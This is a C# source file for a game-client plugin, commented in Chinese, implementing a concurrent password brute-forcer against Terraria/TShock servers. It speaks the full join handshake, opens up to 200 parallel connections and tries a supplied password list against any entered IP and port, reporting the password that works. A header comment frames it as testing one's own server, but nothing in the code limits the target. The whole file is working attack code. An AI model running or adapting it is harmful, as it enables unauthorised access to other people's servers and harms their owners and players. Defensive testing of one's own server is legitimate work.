using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Numerics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ImGuiNET;
using Terraria;
using TerraAngel.Tools;

namespace TaDebug.TAPlugin;

/// <summary>
/// 进服密码爆破工具（安全测试用途：验证自己服务器的进服密码抗暴力破解能力，反哺 TSWeb 反作弊）。
/// 以迷你客户端身份对目标 TShock/Terraria 服务器做并发握手，逐个尝试候选密码。
///
/// ⚠️ 协议基准（源码实证，CrossLoginClient / TransferProtocol 同款）：
///   - 目标：Terraria 1.4.5 / TShock 6.x（与本项目服务器同版本）
///   - 帧格式：[ushort 总长 LE（含 2 字节长度头）][byte 包类型][body...]
///   - 握手序列（每连接一次）：
///       客户端 → 服务器  1 ClientHello(版本串) → 68 ClientUUID
///       服务器 → 客户端  3 LoadPlayer(分配槽位)
///       客户端 → 服务器  4 PlayerInfo(槽位+外观) → 6 ContinueConnecting2
///       服务器 → 客户端  37 RequestPassword（设了进服密码） / 7 WorldData（无密码直接进世界）
///       客户端 → 服务器  38 SendPassword(候选密码)
///       服务器 → 客户端  7 WorldData = 密码正确；2 Kick / 断开 = 密码错误
///   - 判定：收到 7 即成功；发 38 后收到 2 或连接中断即失败。
/// </summary>
public sealed class PasswordBruteTool : Tool
{
    public override string Name => "进服密码爆破";
    public override ToolTabs Tab => ToolTabs.NewTab;

    // ── 用户输入 ──
    private string _ip = "127.0.0.1";
    private int _port = 7777;
    private int _concurrency = 20;
    private string _version = "";        // 留空自动取 Main.curRelease（"Terraria"+curRelease）
    private string _passwords = "# 每行一个候选密码\n";

    // ── 运行状态（后台线程写，UI 读）──
    private volatile bool _running;
    private volatile bool _noPassword;   // 目标未设进服密码
    private volatile string? _found;
    private volatile string? _stopReason;
    private int _tried;
    private int _total;
    private DateTime _startTime;

    private CancellationTokenSource? _cts;
    private readonly ConcurrentQueue<(string msg, bool err, bool ok)> _log = new();
    private readonly List<(string msg, bool err, bool ok)> _logView = new(); // UI 侧渲染缓存

    private static readonly object StartLock = new();

    // ── 控制（DebugPlugin.Unload 调用，防止 #reload 后后台线程泄漏）──
    private static PasswordBruteTool? _instance;

    public PasswordBruteTool()
    {
        _instance = this;
    }

    /// <summary>插件卸载时强制停止所有爆破线程。</summary>
    public static void StopAll()
    {
        var inst = _instance;
        inst?.Stop();
    }

    // ═══════════════════════════════════════════════
    //  UI
    // ═══════════════════════════════════════════════
    public override void DrawUI(ImGuiIOPtr io)
    {
        ImGui.TextUnformatted("目标服务器（进服密码爆破，Terraria 1.4.5 / TShock 6.x）");

        ImGui.SetNextItemWidth(220f);
        ImGui.InputText("IP 地址", ref _ip, 64);
        ImGui.SameLine();
        ImGui.SetNextItemWidth(100f);
        ImGui.InputInt("端口", ref _port);

        ImGui.SetNextItemWidth(120f);
        ImGui.InputInt("并发数", ref _concurrency);
        if (_concurrency < 1) _concurrency = 1;
        if (_concurrency > 200) _concurrency = 200;
        ImGui.SameLine();
        ImGui.SetNextItemWidth(220f);
        ImGui.InputText("版本串（留空自动取当前客户端）", ref _version, 32);

        ImGui.InputTextMultiline(
            "候选密码（每行一个）",
            ref _passwords,
            131072,
            new Vector2(ImGui.GetContentRegionAvail().X, 140f));

        // ── 控制按钮 ──
        if (!_running)
        {
            if (ImGui.Button("开始爆破", new Vector2(120, 0)))
                Start();
        }
        else
        {
            if (ImGui.Button("停止", new Vector2(120, 0)))
                Stop();
            ImGui.SameLine();
            ImGui.TextColored(new Vector4(1f, 0.8f, 0.2f, 1f), "运行中...");
        }

        // ── 状态 ──
        ImGui.TextUnformatted($"进度: {_tried} / {_total}");
        if (_running)
            ImGui.TextUnformatted($"耗时: {(DateTime.UtcNow - _startTime).TotalSeconds:F1}s");

        if (_found != null)
        {
            ImGui.Separator();
            ImGui.TextColored(new Vector4(0.2f, 1f, 0.3f, 1f), $"✅ 进服密码: {_found}");
            ImGui.SameLine();
            if (ImGui.Button("复制"))
            {
                ImGui.SetClipboardText(_found);
                Log("已复制到剪贴板", false, true);
            }
        }
        else if (_noPassword)
        {
            ImGui.Separator();
            ImGui.TextColored(new Vector4(1f, 0.6f, 0.2f, 1f), "目标服务器未设置进服密码（握手直接进世界）");
        }
        else if (_stopReason != null)
        {
            ImGui.Separator();
            ImGui.TextColored(new Vector4(1f, 0.4f, 0.4f, 1f), $"已停止: {_stopReason}");
        }

        // ── 日志（滚动，仅显示最近 200 条）──
        ImGui.Separator();
        ImGui.TextUnformatted("日志:");
        const float logHeight = 240f;
        if (ImGui.BeginChild("##pwdbrute_log", new Vector2(0, logHeight), ImGuiChildFlags.Borders))
        {
            DrainLogQueue();
            if (ImGui.BeginChild("##pwdbrute_log_scroll"))
            {
                foreach (var (msg, err, ok) in _logView)
                {
                    var col = err
                        ? new Vector4(1f, 0.45f, 0.45f, 1f)
                        : ok
                            ? new Vector4(0.4f, 1f, 0.5f, 1f)
                            : new Vector4(0.85f, 0.85f, 0.85f, 1f);
                    ImGui.TextColored(col, msg);
                }
                if (_logView.Count > 0)
                    ImGui.SetScrollHereY(1f); // 自动滚动到底
            }
            ImGui.EndChild();
        }
        ImGui.EndChild();
    }

    private void DrainLogQueue()
    {
        while (_log.TryDequeue(out var item))
        {
            _logView.Add(item);
            if (_logView.Count > 200)
                _logView.RemoveAt(0);
        }
    }

    private void Log(string msg, bool err = false, bool ok = false)
    {
        _log.Enqueue(($"[{DateTime.Now:HH:mm:ss}] {msg}", err, ok));
    }

    // ═══════════════════════════════════════════════
    //  控制
    // ═══════════════════════════════════════════════
    private void Start()
    {
        lock (StartLock)
        {
            if (_running) return;

            var passwords = _passwords
                .Replace("\r\n", "\n")
                .Split('\n')
                .Select(p => p.Trim())
                .Where(p => p.Length > 0 && !p.StartsWith("#")) // # 开头视为注释
                .ToArray();

            if (passwords.Length == 0)
            {
                Log("候选密码列表为空", true);
                return;
            }
            if (string.IsNullOrWhiteSpace(_ip))
            {
                Log("IP 地址为空", true);
                return;
            }
            if (_port < 1 || _port > 65535)
            {
                Log($"端口非法: {_port}", true);
                return;
            }
            if (_concurrency < 1) _concurrency = 1;

            var version = string.IsNullOrWhiteSpace(_version)
                ? "Terraria" + Main.curRelease
                : _version.Trim();

            _logView.Clear();
            _total = passwords.Length;
            _tried = 0;
            _found = null;
            _noPassword = false;
            _stopReason = null;
            _startTime = DateTime.UtcNow;
            _running = true;
            _cts = new CancellationTokenSource();

            var queue = new ConcurrentQueue<string>(passwords);
            var runId = Guid.NewGuid().ToString("N").Substring(0, 4);
            Log($"开始爆破 {_ip}:{_port}  密码数={passwords.Length}  并发={_concurrency}  版本={version}");

            var workers = new Task[_concurrency];
            for (int i = 0; i < _concurrency; i++)
            {
                int w = i;
                workers[i] = Task.Run(() => Worker(w, runId, version, queue, _cts.Token));
            }

            // 后台监视：全部结束后复位状态
            _ = Task.Run(async () =>
            {
                try { await Task.WhenAll(workers); }
                catch { }
                if (!_cts.IsCancellationRequested && _found == null && !_noPassword && _stopReason == null)
                    Log($"全部密码尝试完毕，未找到进服密码（{_total} 个）");
                _running = false;
            });
        }
    }

    private void Stop()
    {
        _cts?.Cancel();
        Log("已请求停止（等待当前连接收尾）", false, false);
    }

    // ═══════════════════════════════════════════════
    //  爆破 Worker
    // ═══════════════════════════════════════════════
    private void Worker(int workerId, string runId, string version, ConcurrentQueue<string> queue, CancellationToken ct)
    {
        // 每 worker 固定玩家名 + 固定 UUID（不同 worker 不同），避免同名冲突 / KickEmptyUUID
        var name = $"pw{workerId}_{runId}";
        var uuid = Guid.NewGuid().ToString("N");

        while (!ct.IsCancellationRequested && queue.TryDequeue(out var pwd))
        {
            var r = TryOnce(name, uuid, version, pwd);
            int triedNow = Interlocked.Increment(ref _tried);

            switch (r.Result)
            {
                case AttemptResult.Success:
                    _found = pwd;
                    Log($"✅ 命中! 密码 = {pwd}（第 {triedNow} 次尝试）", false, true);
                    _cts?.Cancel();
                    return;

                case AttemptResult.NoPassword:
                    _noPassword = true;
                    Log("目标未设进服密码（发 6 后直接收到 WorldData）", false, false);
                    _cts?.Cancel();
                    return;

                case AttemptResult.ConnectFail:
                    _stopReason = $"连接失败: {r.Reason}";
                    Log($"连接失败: {r.Reason}", true);
                    _cts?.Cancel();
                    return;

                case AttemptResult.VersionKick:
                    _stopReason = $"服务器拒绝握手: {r.Reason}";
                    Log($"服务器拒绝握手: {r.Reason}", true);
                    Log("若为版本不匹配，请在上方填写正确版本串（如 Terraria319）后重试", true);
                    _cts?.Cancel();
                    return;

                case AttemptResult.Fail:
                    // 正常失败（密码错误被踢/超时）：仅在非预期原因时记录，避免刷屏
                    if (r.Log)
                        Log($"{name} 尝试失败: {r.Reason}", true);
                    break;
            }
        }
    }

    private static readonly TimeSpan TryTimeout = TimeSpan.FromSeconds(6);

    private (AttemptResult Result, string Reason, bool Log) TryOnce(string name, string uuid, string version, string pwd)
    {
        using var client = new TcpClient();
        client.NoDelay = true;
        client.ReceiveTimeout = (int)TryTimeout.TotalMilliseconds;
        client.SendTimeout = (int)TryTimeout.TotalMilliseconds;

        try
        {
            var connectTask = client.ConnectAsync(_ip, _port);
            if (!connectTask.Wait(TryTimeout))
            {
                client.Dispose();
                return (AttemptResult.ConnectFail, $"连接超时 {_ip}:{_port}", true);
            }
        }
        catch (Exception ex)
        {
            client.Dispose();
            return (AttemptResult.ConnectFail, ex.Message, true);
        }

        NetworkStream? stream = null;
        try
        {
            stream = client.GetStream();

            // 1) ClientHello(1) + 版本串
            WriteFrame(stream, bw =>
            {
                bw.Write((byte)1);
                bw.Write(version);
            });

            // 2) ClientUUID(68)：连接后立即发（照 CrossLoginClient，不等 LoadPlayer）
            WriteFrame(stream, bw =>
            {
                bw.Write((byte)68);
                bw.Write(uuid);
            });

            // 3) 等 LoadPlayer(3) → 发 PlayerInfo(4) + ContinueConnecting2(6)
            while (true)
            {
                var pkt = ReadPacket(stream);
                switch (pkt.Type)
                {
                    case 3: // [byte slot][bool ...]
                        var slot = pkt.Body.Length >= 2 ? pkt.Body[1] : (byte)0;
                        WriteFrame(stream, bw => WritePlayerInfo(bw, slot, name));
                        WriteFrame(stream, bw => bw.Write((byte)6));
                        goto waitPassword;
                    case 2:
                        return (AttemptResult.VersionKick, SafeKickReason(pkt.Body), true);
                    case 7:
                        return (AttemptResult.NoPassword, "无密码直接进世界", false);
                    default:
                        continue; // StatusText 等忽略
                }
            }

        waitPassword:
            // 4) 等 RequestPassword(37) → 发 SendPassword(38)；或直接 WorldData(7) = 无密码
            while (true)
            {
                var pkt = ReadPacket(stream);
                switch (pkt.Type)
                {
                    case 37:
                        WriteFrame(stream, bw =>
                        {
                            bw.Write((byte)38);
                            bw.Write(pwd);
                        });
                        goto waitResult;
                    case 7:
                        return (AttemptResult.NoPassword, "无密码直接进世界", false);
                    case 2:
                        return (AttemptResult.VersionKick, SafeKickReason(pkt.Body), true);
                    default:
                        continue;
                }
            }

        waitResult:
            // 5) 发 38 后：收到 WorldData(7) = 密码正确；Kick(2)/断开/超时 = 失败
            while (true)
            {
                var pkt = ReadPacket(stream);
                switch (pkt.Type)
                {
                    case 7:
                        return (AttemptResult.Success, "", false);
                    case 2:
                        return (AttemptResult.Fail, SafeKickReason(pkt.Body), false); // 正常：密码错误被踢
                    case 129:
                        return (AttemptResult.Success, "", false); // 兜底：连接完成即通过
                    default:
                        continue; // 其他包（StatusText 等）继续等 7
                }
            }
        }
        catch (IOException ex)
        {
            // EOF / ReceiveTimeout：密码错被踢断 / 服务器无响应
            return (AttemptResult.Fail, ex is EndOfStreamException ? "连接断开" : "超时", false);
        }
        catch (Exception ex)
        {
            return (AttemptResult.Fail, ex.Message, true);
        }
        finally
        {
            try { stream?.Dispose(); } catch { }
        }
    }

    private enum AttemptResult
    {
        Success,     // 密码正确
        NoPassword,  // 目标无进服密码
        ConnectFail, // 无法连接（IP/端口错误/服务器未开）
        VersionKick, // 握手被拒（版本不匹配等）
        Fail,        // 密码错误被踢 / 超时
    }

    // ═══════════════════════════════════════════════
    //  协议编解码（Terraria 1.4.5，2 字节 ushort 长度头含头）
    // ═══════════════════════════════════════════════
    private static byte[] WrapFrame(Action<BinaryWriter> writeBody)
    {
        using var ms = new MemoryStream();
        using (var bw = new BinaryWriter(ms, Encoding.UTF8, true))
            writeBody(bw);
        var body = ms.ToArray();
        var total = body.Length + 2; // 长度字段 = 整帧总长（含 2 字节前缀）
        var frame = new byte[total];
        frame[0] = (byte)(total & 0xFF);
        frame[1] = (byte)((total >> 8) & 0xFF);
        Buffer.BlockCopy(body, 0, frame, 2, body.Length);
        return frame;
    }

    private static void WriteFrame(NetworkStream s, Action<BinaryWriter> writeBody)
    {
        var frame = WrapFrame(writeBody);
        s.Write(frame, 0, frame.Length);
    }

    /// <summary>PlayerInfo(4)：顺序与 TShock HandlePlayerInfo / TrProtocol SyncPlayer 一致。</summary>
    private static void WritePlayerInfo(BinaryWriter bw, byte slot, string name)
    {
        bw.Write((byte)4);                      // msgid
        bw.Write(slot);                         // playerid（服务器 LoadPlayer 分配的槽位）
        bw.Write((byte)0);                      // skinVariant
        bw.Write((byte)0);                      // voiceVariant
        bw.Write(0f);                           // voicePitchOffset
        bw.Write((byte)0);                      // hair
        bw.Write(name);                         // string（7bit 长度 + UTF8）
        bw.Write((byte)0);                      // hairDye
        bw.Write((ushort)0);                    // hideVisualFlags
        bw.Write((byte)0);                      // hideMisc
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // hairColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // skinColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // eyeColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // shirtColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // underShirtColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // pantsColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // shoeColor
        bw.Write((byte)0);                      // extra（difficulty=0, 无 extraSlot）
        bw.Write((byte)0);                      // torchFlags
        bw.Write((byte)0);                      // usedXXX 系列
    }

    /// <summary>读一帧：[ushort 总长 LE][body...]，返回 (类型, body 全量)。</summary>
    private static (byte Type, byte[] Body) ReadPacket(NetworkStream s)
    {
        var lenBuf = new byte[2];
        ReadExactly(s, lenBuf, 2);
        var total = lenBuf[0] | (lenBuf[1] << 8);
        if (total < 3 || total > 0xFFFF)
            throw new InvalidDataException($"非法包长度 {total}");
        var body = new byte[total - 2];
        ReadExactly(s, body, body.Length);
        return (body[0], body);
    }

    private static void ReadExactly(NetworkStream s, byte[] buf, int count)
    {
        int read = 0;
        while (read < count)
        {
            var n = s.Read(buf, read, count - read);
            if (n <= 0) throw new EndOfStreamException();
            read += n;
        }
    }

    /// <summary>Kick(2) 包解析：[short playerId][byte mode][string?]（mode==0 Literal）</summary>
    private static string SafeKickReason(byte[] body)
    {
        try
        {
            using var ms = new MemoryStream(body, 1, body.Length - 1);
            using var br = new BinaryReader(ms, Encoding.UTF8);
            br.ReadInt16(); // playerId
            var mode = br.ReadByte();
            if (mode == 0) return br.ReadString();
        }
        catch { }
        return "";
    }
}
